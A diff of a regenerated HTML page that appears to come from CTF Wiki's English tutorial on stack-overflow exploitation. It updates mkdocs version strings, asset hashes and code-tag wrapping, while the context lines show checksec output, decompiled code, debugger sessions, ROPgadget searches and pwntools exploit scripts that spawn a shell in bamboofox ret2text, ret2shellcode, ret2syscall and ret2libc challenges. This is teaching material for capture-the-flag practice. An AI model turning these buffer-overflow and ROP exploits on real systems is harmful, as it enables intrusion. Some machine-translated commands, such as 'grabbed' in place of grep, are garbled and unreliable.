@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4830,7 +4830,7 @@
 <p>In fact, in the basic principle of stack overflow, we have introduced this simple attack. Here, let&#39;s give another example, the example of ret2text used in Bamboofox to introduce ROP.</p>
 <p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p>
 <p>First, check out the protection mechanism of the program.</p>
-<div class="codehilite"><pre><span></span>➜  ret2text checksec ret2text
+<div class="codehilite"><pre><span></span><code>➜  ret2text checksec ret2text
 
     Arch:     i386-32-little
 
@@ -4841,10 +4841,10 @@
     NX:       NX enabled
 
     PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that the program is a 32-bit program that only turns on stack unexecutable protection. Then we use IDA to view the source code.</p>
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 
 <span class="p">{</span>
 
@@ -4864,7 +4864,7 @@
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that the program uses the gets function in the main function, and obviously there is a stack overflow vulnerability. Later discovered</p>
 <p><code>`</code>asm
@@ -4891,7 +4891,7 @@
 <p>.text:08048638                 jnz     short locret_8048646</p>
 <p>.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"</p>
 <p>.text:08048641                 call    _system</p>
-<div class="codehilite"><pre><span></span>In the secure function, it is found that there is code calling system(&amp;quot;/bin/sh&amp;quot;), then if we directly control the program to return to 0x0804863A, then we can get the system shell.
+<div class="codehilite"><pre><span></span><code>In the secure function, it is found that there is code calling system(&amp;quot;/bin/sh&amp;quot;), then if we directly control the program to return to 0x0804863A, then we can get the system shell.
 
 
 Here&amp;#39;s how we construct the payload. The first thing we need to determine is the number of bytes from the start address of the memory we can control from the return address of the main function.
@@ -4903,10 +4903,10 @@ Here&amp;#39;s how we construct the payload. The first thing we need to determin
 .text:080486AB                 mov     [esp], eax      ; s
 
 .text:080486AE                 call    _gets
-</pre></div>
+</code></pre></div>
 
 <p>You can see that the string is indexed relative to esp, so we need to debug, put the breakpoint at the call, view esp, ebp, as follows</p>
-<div class="codehilite"><pre><span></span>gef➤  b *0x080486AE
+<div class="codehilite"><pre><span></span><code>gef➤  b *0x080486AE
 
 Breakpoint <span class="m">1</span> at 0x80486ae: file ret2text.c, line <span class="m">24</span>.
 
@@ -4936,11 +4936,11 @@ $ ecx: 0xffffffff
 $ you are: 0xf7fae000 → 0x001b1db0
 $ edi: 0xf7fae000 → 0x001b1db0
 $ Eip: 0x080486ae → &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;
-</pre></div>
+</code></pre></div>
 
 <p>You can see that esp is 0xffffcd40, ebp is the specific payload as follows 0xffffcdc8, and the index of s relative to esp is [esp+0x1c], so the address of s is 0xffffcd5c, so the offset of s relative to ebp is 0x6C, so the relative The offset from the return address is 0x6c+4.</p>
 <p>The final payload is as follows:</p>
-<div class="codehilite"><pre><span></span><span class="c1">##!/usr/bin/env python</span>
+<div class="codehilite"><pre><span></span><code><span class="c1">##!/usr/bin/env python</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -4953,7 +4953,7 @@ $ Eip: 0x080486ae → &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x6c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
 
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h2 id="ret2shellcode">ret2shellcode<a class="headerlink" href="#ret2shellcode" title="Permanent link">&para;</a></h2>
 <h3 id="principle_1">Principle<a class="headerlink" href="#principle_1" title="Permanent link">&para;</a></h3>
@@ -4963,7 +4963,7 @@ $ Eip: 0x080486ae → &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;
 <p>Here we take ret2shellcode in bamboofox as an example.</p>
 <p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
 <p>First check the protection of the program open</p>
-<div class="codehilite"><pre><span></span>➜  ret2shellcode checksec ret2shellcode
+<div class="codehilite"><pre><span></span><code>➜  ret2shellcode checksec ret2shellcode
 
     Arch:     i386-32-little
 
@@ -4976,10 +4976,10 @@ $ Eip: 0x080486ae → &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;
     PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
 
     RWX:      Has RWX segments
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that the source program has almost no protection turned on, and is readable, writable, and executable. Let&#39;s look at the program again using IDA.</p>
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 
 <span class="p">{</span>
 
@@ -5001,13 +5001,13 @@ $ Eip: 0x080486ae → &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that the program is still a basic stack overflow vulnerability, but this time also copy the corresponding string to buf2. A simple view shows that buf2 is in the bss section.</p>
 <p><code>`</code>asm
 .bss:0804A080                 public buf2</p>
 <p>.bss:0804A080 ; char buf2[100]</p>
-<div class="codehilite"><pre><span></span>At this point, we simply debug the program to see if this bss section is executable.
+<div class="codehilite"><pre><span></span><code>At this point, we simply debug the program to see if this bss section is executable.
 
 
 ```shell
@@ -5079,15 +5079,15 @@ Start      End        Offset     Perm Path
 0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
 
 0xfffdd000 0xffffe000 0x00000000 rwx [stack]
-</pre></div>
+</code></pre></div>
 
 <p>Through vmmap, we can see that the segment corresponding to the bss segment has executable permissions.</p>
-<div class="codehilite"><pre><span></span>0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
-</pre></div>
+<div class="codehilite"><pre><span></span><code>0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
+</code></pre></div>
 
 <p>So this time we control the program to execute the shellcode, which is to read the shellcode, and then control the program to execute the shellcode at the bss section. Among them, the corresponding offset calculation is similar to the example in ret2text.</p>
 <p>The specific payload is as follows</p>
-<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -5103,7 +5103,7 @@ Start      End        Offset     Perm Path
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">112</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf2_addr</span><span class="p">))</span>
 
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="title">Title<a class="headerlink" href="#title" title="Permanent link">&para;</a></h3>
 <ul>
@@ -5116,7 +5116,7 @@ Start      End        Offset     Perm Path
 <p>Here we take ret2syscall in bamboofox as an example.</p>
 <p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p>
 <p>First check the protection of the program open</p>
-<div class="codehilite"><pre><span></span>➜  ret2syscall checksec rop
+<div class="codehilite"><pre><span></span><code>➜  ret2syscall checksec rop
 
     Arch:     i386-32-little
 
@@ -5127,10 +5127,10 @@ Start      End        Offset     Perm Path
     NX:       NX enabled
 
     PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that the source program is 32-bit and NX protection is turned on. Next use IDA to view the source code</p>
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 
 <span class="p">{</span>
 
@@ -5151,15 +5151,15 @@ Start      End        Offset     Perm Path
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that this is still a stack overflow. Similar to the previous approach, we can get the offset of v4 relative to ebp to 108. So the return address we need to override is 112 relative to v4. This time, because we can&#39;t directly use a piece of code in the program or fill in the code to get the shell, we use the gadgets in the program to get the shell, and the corresponding shell acquisition uses the system call. For knowledge about system calls, please refer to</p>
 <ul>
 <li><a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li>
 </ul>
 <p>To put it simply, as long as we put the parameters of the system call corresponding to the get shell into the corresponding registers, we can execute the corresponding system call by executing int 0x80. For example, here we use the following system call to get the shell</p>
-<div class="codehilite"><pre><span></span><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">)</span>
-</pre></div>
+<div class="codehilite"><pre><span></span><code><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">)</span>
+</code></pre></div>
 
 <p>Among them, the program is 32 bit, so we need to make</p>
 <ul>
@@ -5170,7 +5170,7 @@ Start      End        Offset     Perm Path
 </ul>
 <p>And how do we control the values of these registers? Here you need to use gadgets. For example, if the top of the stack is now 10, then if pop eax is executed at this time, the value of eax is now 10. But we can&#39;t expect a continuous code to control the corresponding registers at the same time, so we need a piece of control, which is why we use ret at the end of the gadgets to control the execution flow again. To find out how to use gadgets, we can use the ropgadgets tool.</p>
 <p>First, let&#39;s look for gadgets that control eax.</p>
-<div class="codehilite"><pre><span></span>➜ ret2syscall ROPgadget --binary call --only <span class="p">&amp;</span><span class="c1">#39;pop | right&amp;#39; | grabbed &amp;#39;eax&amp;#39;</span>
+<div class="codehilite"><pre><span></span><code>➜ ret2syscall ROPgadget --binary call --only <span class="p">&amp;</span><span class="c1">#39;pop | right&amp;#39; | grabbed &amp;#39;eax&amp;#39;</span>
 0x0809ddda : pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
 
 0x080bb196 : pop eax <span class="p">;</span> ret
@@ -5180,11 +5180,11 @@ Start      End        Offset     Perm Path
 0x0804f704 : pop eax <span class="p">;</span> ret <span class="m">3</span>
 
 0x0809ddd9 : pop es <span class="p">;</span> pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
-</pre></div>
+</code></pre></div>
 
 <p>You can see that all of the above can control eax, and I choose the second one as the gadgets.</p>
 <p>Similarly, we can get gadgets that control other registers.</p>
-<div class="codehilite"><pre><span></span>➜ ret2syscall ROPgadget --binary call --only <span class="p">&amp;</span><span class="c1">#39;pop | right&amp;#39; | grab &amp;#39;ebx&amp;#39;</span>
+<div class="codehilite"><pre><span></span><code>➜ ret2syscall ROPgadget --binary call --only <span class="p">&amp;</span><span class="c1">#39;pop | right&amp;#39; | grab &amp;#39;ebx&amp;#39;</span>
 0x0809dde2: pop ds<span class="p">;</span> pop ebx<span class="p">;</span> pop esi<span class="p">;</span> pop edi<span class="p">;</span> ret
 0x0809ddda : pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
 
@@ -5227,25 +5227,25 @@ Start      End        Offset     Perm Path
 0x08050256 : pop esp <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret
 
 0x0807b6ed : pop ss <span class="p">;</span> pop ebx <span class="p">;</span> ret
-</pre></div>
+</code></pre></div>
 
 <p>Here, I choose</p>
-<div class="codehilite"><pre><span></span>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
-</pre></div>
+<div class="codehilite"><pre><span></span><code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
+</code></pre></div>
 
 <p>This can directly control the other three registers.</p>
 <p>In addition, we need to get the address corresponding to the /bin/sh string.</p>
-<div class="codehilite"><pre><span></span>➜  ret2syscall ROPgadget --binary rop  --string <span class="s1">&#39;/bin/sh&#39;</span> 
+<div class="codehilite"><pre><span></span><code>➜  ret2syscall ROPgadget --binary rop  --string <span class="s1">&#39;/bin/sh&#39;</span> 
 
 Strings <span class="nv">information</span>
 
 <span class="o">============================================================</span>
 
 0x080be408 : /bin/sh
-</pre></div>
+</code></pre></div>
 
 <p>You can find the corresponding address, in addition, there is an address of int 0x80, as follows</p>
-<div class="codehilite"><pre><span></span>➜  ret2syscall ROPgadget --binary rop  --only &#39;int&#39;                 
+<div class="codehilite"><pre><span></span><code>➜  ret2syscall ROPgadget --binary rop  --only &#39;int&#39;                 
 
 Gadgets information
 
@@ -5262,11 +5262,11 @@ Gadgets information
 
 
 Unique gadgets found: 4
-</pre></div>
+</code></pre></div>
 
 <p>At the same time, I also found the corresponding address.</p>
 <p>The following is the corresponding payload, where 0xb is the system call number corresponding to execve.</p>
-<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -5288,7 +5288,7 @@ Unique gadgets found: 4
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="title_1">Title<a class="headerlink" href="#title_1" title="Permanent link">&para;</a></h3>
 <h2 id="ret2libc">ret2libc<a class="headerlink" href="#ret2libc" title="Permanent link">&para;</a></h2>
@@ -5300,7 +5300,7 @@ Unique gadgets found: 4
 <p>Here we take ret2libc1 in bamboofox as an example.</p>
 <p>Click to download: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p>
 <p>First, we can check the security of the program.</p>
-<div class="codehilite"><pre><span></span>➜  ret2libc1 checksec ret2libc1    
+<div class="codehilite"><pre><span></span><code>➜  ret2libc1 checksec ret2libc1    
 
     Arch:     i386-32-little
 
@@ -5311,10 +5311,10 @@ Unique gadgets found: 4
     NX:       NX enabled
 
     PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>The source program is 32-bit and NX protection is turned on. Let&#39;s take a look at the program source code to determine the location of the vulnerability.</p>
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 
 <span class="p">{</span>
 
@@ -5332,22 +5332,22 @@ Unique gadgets found: 4
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>You can see that a stack overflow occurred while executing the gets function. Also, with ropgadget, we can see if /bin/sh exists</p>
-<div class="codehilite"><pre><span></span>➜  ret2libc1 ROPgadget --binary ret2libc1 --string <span class="s1">&#39;/bin/sh&#39;</span>          
+<div class="codehilite"><pre><span></span><code>➜  ret2libc1 ROPgadget --binary ret2libc1 --string <span class="s1">&#39;/bin/sh&#39;</span>          
 
 Strings <span class="nv">information</span>
 
 <span class="o">============================================================</span>
 
 0x08048720 : /bin/sh
-</pre></div>
+</code></pre></div>
 
 <p>It does exist, look again to see if there is a system function. It is true that it is found in ida.</p>
 <p><code>`</code>asm
 .plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</p>
-<div class="codehilite"><pre><span></span>So, we go back directly to it, executing the system function. The corresponding payload is as follows
+<div class="codehilite"><pre><span></span><code>So, we go back directly to it, executing the system function. The corresponding payload is as follows
 
 
 ```python
@@ -5372,7 +5372,7 @@ sh.sendline(payload)
 
 
 sh.interactive()
-</pre></div>
+</code></pre></div>
 
 <p>Here we need to pay attention to the structure of the function call stack. If the system function is called normally, we will have a corresponding return address when calling, where &#39;bbbb&#39; is used as the fake address, and then the parameter content corresponding to the parameter.</p>
 <p>This example is relatively simple, and provides the address of the system address and /bin/sh, but most programs don&#39;t have such a good condition.</p>
@@ -5380,7 +5380,7 @@ sh.interactive()
 <p>Here is an example of ret2libc2 in bamboofox.</p>
 <p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p>
 <p>This topic is basically the same as in Example 1, except that the /bin/sh string no longer appears, so we need to read the string ourselves, so we need two gadgets, the first control program reads the string, the first The two control programs execute system(&quot;/bin/sh&quot;). Since the vulnerability is consistent with the above, here is not to say more, the specific exp is as follows</p>
-<div class="codehilite"><pre><span></span><span class="c1">##!/usr/bin/env python</span>
+<div class="codehilite"><pre><span></span><code><span class="c1">##!/usr/bin/env python</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -5405,14 +5405,14 @@ sh.interactive()
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
 
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>Note that I am writing the /bin/sh string to buf2 in the bss section of the program and passing its address as a parameter to system. This is so easy to get the shell.</p>
 <h4 id="example-3">Example 3<a class="headerlink" href="#example-3" title="Permanent link">&para;</a></h4>
 <p>Here is an example of ret2libc3 in bamboofox.</p>
 <p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p>
 <p>On the basis of Example 2, the address of the system function is removed again. At this point, we need to find both the address of the system function and the address of the /bin/sh string. First, check the security</p>
-<div class="codehilite"><pre><span></span>➜  ret2libc3 checksec ret2libc3
+<div class="codehilite"><pre><span></span><code>➜  ret2libc3 checksec ret2libc3
 
     Arch:     i386-32-little
 
@@ -5423,10 +5423,10 @@ sh.interactive()
     NX:       NX enabled
 
     PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>As you can see, the source program still has stack unexecutable protection turned on. Looking at the source code, I found that the bug in the program is still a stack overflow.</p>
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 
 <span class="p">{</span>
 
@@ -5446,7 +5446,7 @@ sh.interactive()
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>So how do we get the address of the system function? Here mainly use two knowledge points</p>
 <ul>
@@ -5470,7 +5470,7 @@ sh.interactive()
 <li>Trigger stack overflow execution system(&#39;/bin/sh&#39;)</li>
 </ul>
 <p>Exp is as follows</p>
-<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -5522,7 +5522,7 @@ sh.interactive()
 
 
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="title_2">Title<a class="headerlink" href="#title_2" title="Permanent link">&para;</a></h3>
 <ul>
@@ -5610,7 +5610,7 @@ sh.interactive()
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5625,7 +5625,7 @@ sh.interactive()
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
